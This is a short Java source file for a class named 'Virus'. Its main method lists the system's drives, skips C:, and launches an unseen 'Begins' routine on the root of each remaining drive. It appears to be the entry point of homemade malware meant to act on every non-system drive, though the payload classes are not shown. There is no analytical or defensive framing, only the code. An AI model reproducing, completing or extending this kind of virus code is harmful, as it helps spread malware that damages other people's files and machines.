public class Virus
{
    public static void main(String re[])
    {
        String dir[]=new Dir().getdir();
        for(int i=0;i<dir.length;i++)
        {
         if(dir[i].substring(1,dir[i].lastIndexOf("\"")).equalsIgnoreCase("c"))
      {
          continue;
      }
        else
         {
             new Begins(dir[i].substring(1, dir[i].lastIndexOf("\"")) + ":/");
        }
      }
    }
}
